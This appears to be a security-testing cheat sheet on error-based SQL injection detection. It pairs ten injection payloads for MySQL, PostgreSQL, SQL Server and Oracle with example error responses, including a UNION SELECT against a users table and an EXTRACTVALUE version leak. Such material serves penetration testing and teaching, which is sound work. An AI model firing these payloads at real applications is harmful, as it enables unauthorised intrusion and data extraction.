# 🧠 SQL Injection – Error-Based Detection Examples

## 📌 Overview

Error-based SQL injection detection relies on triggering database errors and analyzing how the application responds.

When an application reflects database errors, it often indicates:

* Improper input sanitization
* Direct query execution with user input

---

## 🔍 1. Classic Syntax Error

### 🔹 Payload

```sql id="i6b0um"
'
```

### 🔍 Example Response

```text id="r4v1e7"
SQL syntax error near '' at line 1
```

### 📌 Meaning

* Query is broken due to unescaped input
* Strong indication of SQL injection

---

## 🔍 2. MySQL Error Message

### 🔹 Payload

```sql id="1t0cmk"
' ORDER BY 100--
```

### 🔍 Example Response

```text id="f0l8li"
Unknown column '100' in 'order clause'
```

### 📌 Meaning

* Query executed but column index invalid
* Confirms injection + helps find column count

---

## 🔍 3. PostgreSQL Error

### 🔹 Payload

```sql id="vcd6t5"
'::int
```

### 🔍 Example Response

```text id="y2y3zv"
invalid input syntax for type integer: "'"
```

### 📌 Meaning

* Type casting failed
* Confirms backend is PostgreSQL and injectable

---

## 🔍 4. SQL Server Error

### 🔹 Payload

```sql id="zjqkpg"
' + CAST(1/0 AS int)--
```

### 🔍 Example Response

```text id="3i2q06"
Divide by zero error encountered.
```

### 📌 Meaning

* Database executed injected logic
* Strong confirmation of SQLi

---

## 🔍 5. Oracle Error

### 🔹 Payload

```sql id="y2q6t3"
'||(SELECT 1 FROM dual)||
```

### 🔍 Example Response

```text id="8r7zhr"
ORA-00933: SQL command not properly ended
```

### 📌 Meaning

* Oracle-specific error
* Confirms injection and DB type

---

## 🔍 6. Data Type Mismatch Error

### 🔹 Payload

```sql id="d5v7h4"
' AND 1='a
```

### 🔍 Example Response

```text id="6v9wcf"
Conversion failed when converting the varchar value 'a' to data type int
```

### 📌 Meaning

* Backend tries to compare incompatible types
* Indicates query execution with user input

---

## 🔍 7. Table/Column Error

### 🔹 Payload

```sql id="d4qv5o"
' UNION SELECT username FROM users--
```

### 🔍 Example Response

```text id="4h3jgh"
Unknown column 'username' in 'field list'
```

### 📌 Meaning

* Injection works
* Helps identify valid column names

---

## 🔍 8. Function-Based Error

### 🔹 Payload

```sql id="n0fclo"
' AND EXTRACTVALUE(1, CONCAT(0x7e,version()))--
```

### 🔍 Example Response

```text id="5clw0b"
XPATH syntax error: '~8.0.31'
```

### 📌 Meaning

* Database version leaked through error
* Used for data extraction

---

## 🔍 9. JSON/XML Parsing Error

### 🔹 Payload

```sql id="tjqh4e"
' AND JSON_EXTRACT('invalid', '$.key')--
```

### 🔍 Example Response

```text id="nq3td3"
Invalid JSON text
```

### 📌 Meaning

* Backend processes input inside SQL function
* Confirms injection

---

## 🔍 10. Generic Application Error (Hidden SQL Error)

### 🔹 Payload

```sql id="ntr4fi"
'
```

### 🔍 Example Response

```text id="j4d5r7"
Internal Server Error (500)
```

### 📌 Meaning

* Backend error hidden from user
* Still strong indicator of SQLi

---

## ⚠️ Important Notes

* Some applications hide SQL errors → use blind techniques
* Error messages can reveal:

  * Database type
  * Table/column names
  * Query structure

---

## 🎯 Key Takeaways

* Error messages are the **strongest initial signal** of SQL injection
* Different databases produce **different error patterns**
* Even generic errors (500) can indicate vulnerability
* Always test with simple payloads first

---

## 🧠 Pro Tip

If you see ANY of the following:

* SQL-related keywords in response
* Unexpected errors after input
* Type conversion issues

👉 Treat it as a potential SQL injection

---
